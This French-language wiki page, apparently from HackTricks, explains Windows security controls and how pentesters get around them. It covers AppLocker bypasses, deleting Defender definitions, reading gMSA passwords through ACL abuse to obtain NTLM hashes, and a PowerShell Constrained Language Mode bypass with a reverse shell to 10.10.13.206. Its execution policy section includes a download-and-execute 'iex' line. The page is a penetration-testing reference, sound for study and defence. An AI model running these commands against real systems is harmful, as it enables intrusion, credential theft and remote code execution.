# Contrôles de sécurité Windows

{{#include ../../banners/hacktricks-training.md}}

## Stratégie AppLocker

Une liste blanche d’applications est une liste de logiciels ou d’exécutables approuvés qui sont autorisés à être présents et à s’exécuter sur un système. L’objectif est de protéger l’environnement contre les malwares nuisibles et les logiciels non approuvés qui ne répondent pas aux besoins spécifiques de l’organisation.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la **solution de liste blanche d’applications** de Microsoft et permet aux administrateurs système de contrôler **quelles applications et quels fichiers les utilisateurs peuvent exécuter**. Il fournit un **contrôle granulaire** des exécutables, des scripts, des fichiers d’installation Windows, des DLL, des applications empaquetées et des programmes d’installation d’applications empaquetées.\
Il est courant que les organisations **bloquent cmd.exe et PowerShell.exe** et l’accès en écriture à certains répertoires, **mais tout cela peut être contourné**.

### Vérification

Vérifiez quels fichiers/extensions figurent sur la liste noire ou la liste blanche :

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Ce chemin de registre contient les configurations et les stratégies appliquées par AppLocker, ce qui permet d’examiner l’ensemble actuel des règles appliquées sur le système :

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Dossiers accessibles en écriture** utiles pour contourner la stratégie AppLocker : si AppLocker autorise l’exécution de n’importe quel fichier dans `C:\Windows\System32` ou `C:\Windows`, vous pouvez utiliser des **dossiers accessibles en écriture** pour **la contourner**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Les binaires [**« LOLBAS's »**](https://lolbas-project.github.io/) couramment **fiables** peuvent également être utiles pour contourner AppLocker.
- Des **règles mal écrites peuvent aussi être contournées**
  - Par exemple, avec **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n’importe où, et il sera autorisé.
  - Les organisations se concentrent aussi souvent sur le **blocage de l’exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mais oublient les **autres** [**emplacements de l’exécutable PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- **L’application des règles aux DLL est très rarement activée**, en raison de la charge supplémentaire que cela peut imposer au système et des tests nécessaires pour s’assurer que rien ne cessera de fonctionner. Les **DLL utilisées comme backdoors peuvent donc aider à contourner AppLocker**.
- Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code PowerShell** dans n’importe quel processus et contourner AppLocker. Pour plus d’informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Stockage des identifiants

### Security Accounts Manager (SAM)

Les identifiants locaux se trouvent dans ce fichier ; les mots de passe y sont hachés.

### Local Security Authority (LSA) - LSASS

Les **identifiants** (hachés) sont **enregistrés** dans la **mémoire** de ce sous-système pour permettre l’authentification unique (Single Sign-On).\
**LSA** administre la **politique de sécurité** locale (politique de mots de passe, autorisations des utilisateurs...), l’**authentification**, les **jetons d’accès**...\
LSA est chargé de **vérifier** les identifiants fournis dans le fichier **SAM** (pour une connexion locale) et de **communiquer** avec le **contrôleur de domaine** pour authentifier un utilisateur du domaine.

Les **identifiants** sont **enregistrés** dans le **processus LSASS** : tickets Kerberos, hashes NT et LM, mots de passe facilement déchiffrables.

### Secrets LSA

LSA peut enregistrer certains identifiants sur le disque :

- Mot de passe du compte ordinateur d’Active Directory (contrôleur de domaine inaccessible).
- Mots de passe des comptes des services Windows
- Mots de passe des tâches planifiées
- Autres (mot de passe des applications IIS...)

### NTDS.dit

Il s’agit de la base de données d’Active Directory. Elle est présente uniquement sur les contrôleurs de domaine.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) est un antivirus disponible sous Windows 10 et Windows 11, ainsi que dans certaines versions de Windows Server. Il **bloque** les outils courants de pentesting tels que **`WinPEAS`**. Il existe toutefois des moyens de **contourner ces protections**.

### Vérification

Pour vérifier l’**état** de **Defender**, vous pouvez exécuter la cmdlet PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir s’il est actif) :

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Vous pouvez également l’énumérer en exécutant :

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Système de fichiers chiffrés (EFS)

EFS protège les fichiers par chiffrement, à l’aide d’une **clé symétrique** appelée **File Encryption Key (FEK)**. Cette clé est chiffrée avec la **clé publique** de l’utilisateur et stockée dans le **flux de données alternatif** $EFS du fichier chiffré. Lorsqu’un déchiffrement est nécessaire, la **clé privée** correspondante du certificat numérique de l’utilisateur sert à déchiffrer la FEK depuis le flux $EFS. Vous trouverez plus de détails [ici](https://en.wikipedia.org/wiki/Encrypting_File_System).

Les **scénarios de déchiffrement sans intervention de l’utilisateur** comprennent :

- Lorsque des fichiers ou des dossiers sont déplacés vers un système de fichiers non-EFS, comme [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), ils sont automatiquement déchiffrés.
- Les fichiers chiffrés envoyés sur le réseau via le protocole SMB/CIFS sont déchiffrés avant leur transmission.

Cette méthode de chiffrement permet au propriétaire d’accéder **de manière transparente** aux fichiers chiffrés. Cependant, changer simplement le mot de passe du propriétaire et se connecter ne permettra pas de les déchiffrer.

**Points clés** :

- EFS utilise une FEK symétrique, chiffrée avec la clé publique de l’utilisateur.
- Le déchiffrement utilise la clé privée de l’utilisateur pour accéder à la FEK.
- Le déchiffrement automatique se produit dans certaines conditions, par exemple lors d’une copie vers FAT32 ou d’une transmission réseau.
- Le propriétaire peut accéder aux fichiers chiffrés sans étape supplémentaire.

### Vérifier les informations EFS

Vérifiez si un **utilisateur** a **utilisé** ce **service** en contrôlant si ce chemin existe :`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Vérifiez **qui** a **accès** au fichier avec cipher /c \<file>\
Vous pouvez aussi utiliser `cipher /e` et `cipher /d` dans un dossier pour **chiffrer** et **déchiffrer** tous les fichiers

### Déchiffrer des fichiers EFS

#### Avec les privilèges SYSTEM

Cette méthode nécessite que **l’utilisateur victime** ait un **processus** en **cours d’exécution** sur l’hôte. Si c’est le cas, avec une session `meterpreter`, vous pouvez usurper le token du processus de l’utilisateur (`impersonate_token` depuis `incognito`). Vous pouvez également simplement `migrate` vers le processus de l’utilisateur.

#### Connaître le mot de passe de l’utilisateur

Mimikatz explique comment importer le certificat et la clé privée de l’utilisateur, puis déchiffrer les fichiers protégés par EFS lorsque son mot de passe est connu.<sup>[[6]](#references)</sup>

## Comptes de service gérés de groupe (gMSA)

Microsoft a développé les **Group Managed Service Accounts (gMSA)** pour simplifier la gestion des comptes de service dans les infrastructures informatiques. Contrairement aux comptes de service traditionnels, pour lesquels le paramètre « **Password never expire** » est souvent activé, les gMSA offrent une solution plus sécurisée et plus facile à gérer :

- **Gestion automatique des mots de passe** : les gMSA utilisent un mot de passe complexe de 240 caractères, qui change automatiquement selon la stratégie du domaine ou de l’ordinateur. Ce processus est géré par le Key Distribution Service (KDC) de Microsoft, ce qui élimine la nécessité de mettre à jour manuellement les mots de passe.
- **Sécurité renforcée** : ces comptes ne peuvent pas être verrouillés et ne peuvent pas être utilisés pour des connexions interactives, ce qui renforce leur sécurité.
- **Prise en charge de plusieurs hôtes** : les gMSA peuvent être partagés entre plusieurs hôtes, ce qui les rend idéaux pour les services exécutés sur plusieurs serveurs.
- **Prise en charge des tâches planifiées** : contrairement aux comptes de service gérés, les gMSA permettent d’exécuter des tâches planifiées.
- **Gestion simplifiée des SPN** : le système met automatiquement à jour le Service Principal Name (SPN) lorsque les informations sAMaccount ou le nom DNS de l’ordinateur changent, ce qui simplifie la gestion des SPN.

Les mots de passe des gMSA sont stockés dans la propriété LDAP _**msDS-ManagedPassword**_ et sont automatiquement réinitialisés tous les 30 jours par les Domain Controllers (DC). Ce mot de passe, un blob de données chiffré appelé [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), ne peut être récupéré que par les administrateurs autorisés et les serveurs sur lesquels les gMSA sont installés, ce qui garantit un environnement sécurisé. Pour accéder à ces informations, une connexion sécurisée telle que LDAPS est nécessaire, ou la connexion doit être authentifiée avec « Sealing & Secure ».

![Relayer l’authentification NTLM pour récupérer un mot de passe gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

Vous pouvez lire ce mot de passe avec [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)** :**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Trouver plus d’informations dans la recherche originale archivée**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

La même recherche explique comment une **attaque NTLM relay** peut obtenir un **mot de passe gMSA** lorsque le principal relayé est autorisé à lire `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Abuser du chaînage d’ACL pour lire le mot de passe gMSA (GenericAll -> ReadGMSAPassword)

Dans de nombreux environnements, les utilisateurs à faibles privilèges peuvent accéder aux secrets gMSA sans compromettre le DC, en exploitant des ACL d’objet mal configurées :<sup>[[3]](#references)</sup>

- Un groupe que vous pouvez contrôler (par exemple, via GenericAll/GenericWrite) se voit accorder `ReadGMSAPassword` sur un gMSA.
- En vous ajoutant à ce groupe, vous héritez du droit de lire le blob `msDS-ManagedPassword` du gMSA via LDAP et d’en dériver des identifiants NTLM utilisables.

Workflow typique :

1) Découvrez le chemin avec BloodHound et marquez vos principaux de foothold comme Owned. Recherchez des relations telles que :
   - GroupA GenericAll -> GroupB ; GroupB ReadGMSAPassword -> gMSA

2) Ajoutez-vous au groupe intermédiaire que vous contrôlez (exemple avec bloodyAD) :

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Lire le mot de passe gMSA géré via LDAP et en dériver le hash NTLM. NetExec automatise l’extraction de `msDS-ManagedPassword` et sa conversion en hash NTLM :

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Authentifiez-vous en tant que gMSA avec le hash NTLM (aucun mot de passe en clair nécessaire). Si le compte appartient au groupe Remote Management Users, WinRM fonctionnera directement :

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Notes :
- Les lectures LDAP de `msDS-ManagedPassword` nécessitent le sealing (p. ex., LDAPS/sign+seal). Les outils le gèrent automatiquement.
- Des droits locaux tels que WinRM sont souvent accordés aux gMSA ; vérifiez l’appartenance aux groupes (p. ex., Remote Management Users) pour planifier le mouvement latéral.
- Si vous avez uniquement besoin du blob pour calculer vous-même le NTLM, consultez la structure MSDS-MANAGEDPASSWORD_BLOB.

Une autre voie via ACL consiste à disposer d’un droit d’écriture sur l’objet gMSA lui-même. `msDS-GroupMSAMembership` est le descripteur de sécurité utilisé pour déterminer quels principaux peuvent récupérer le mot de passe géré. Son GUID de schéma est `888eedd6-ce04-df40-b462-b8a50e41ba38`. Une ACE `WriteProperty` exacte sur cet attribut, accordée à un groupe que vous contrôlez, peut permettre de modifier la liste des lecteurs ; c’est différent du fait d’y figurer déjà. Vérifiez la DACL complète, les ACE de refus et héritées, ainsi que les autorisations effectives avant de considérer cette voie comme exploitable. Une nouvelle appartenance à un groupe nécessite également un jeton/une session actualisé(e) avant toute tentative de lecture du mot de passe.<sup>[[7]](#references)</sup>



## LAPS

La **Local Administrator Password Solution (LAPS)**, disponible en téléchargement sur [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permet de gérer les mots de passe des comptes Administrator locaux. Ces mots de passe, **aléatoires**, uniques et **régulièrement modifiés**, sont stockés de manière centralisée dans Active Directory. L’accès à ces mots de passe est restreint par des ACL aux utilisateurs autorisés. Des autorisations suffisantes permettent de lire les mots de passe des comptes admin locaux.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Le [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) de PowerShell **verrouille de nombreuses fonctionnalités** nécessaires pour utiliser efficacement PowerShell, notamment en bloquant les objets COM et en n’autorisant que les types .NET approuvés, les workflows basés sur XAML, les classes PowerShell, et plus encore.

### **Vérification**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Sur les versions actuelles de Windows, ce bypass ne fonctionne plus, mais vous pouvez utiliser [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Pour le compiler, vous devrez peut-être** **Ajouter une référence** -> _Parcourir_ ->_Parcourir_ -> ajouter `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` et **modifier le projet pour utiliser .Net4.5**.

#### Bypass direct :

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n’importe quel processus et contourner le mode contraint. Pour plus d’informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Stratégie d’exécution PS

Par défaut, elle est définie sur **restricted.** Principales façons de contourner cette stratégie :

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

On en trouvera davantage [ici](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Interface du fournisseur de support de sécurité (SSPI)

Il s’agit de l’API qui peut être utilisée pour authentifier les utilisateurs.

SSPI sélectionne un protocole d’authentification approprié pour deux machines en communication, en privilégiant Kerberos lorsque celui-ci est disponible. Ces protocoles sont implémentés par des fournisseurs de support de sécurité (SSP), installés sous forme de DLL sous Windows ; les deux pairs doivent prendre en charge le fournisseur négocié.

### Principaux SSP

- **Kerberos** : le protocole privilégié
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** et **NTLMv2** : pour des raisons de compatibilité
  - %windir%\Windows\System32\msv1_0.dll
- **Digest** : serveurs web et LDAP ; mot de passe sous forme de hachage MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel** : SSL et TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate** : utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM, Kerberos étant le protocole par défaut)
  - %windir%\Windows\System32\lsasrv.dll

#### La négociation peut proposer plusieurs méthodes ou une seule.

## UAC - Contrôle de compte d’utilisateur

Le [contrôle de compte d’utilisateur (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui affiche une **demande de consentement pour les activités nécessitant des privilèges élevés**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relais pour gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf : gMSA via le chaînage de droits jusqu’à WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Contourner AppLocker et le mode de langage restreint de PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 façons de contourner la stratégie d’exécution de PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ déchiffrer des fichiers EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - attribut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
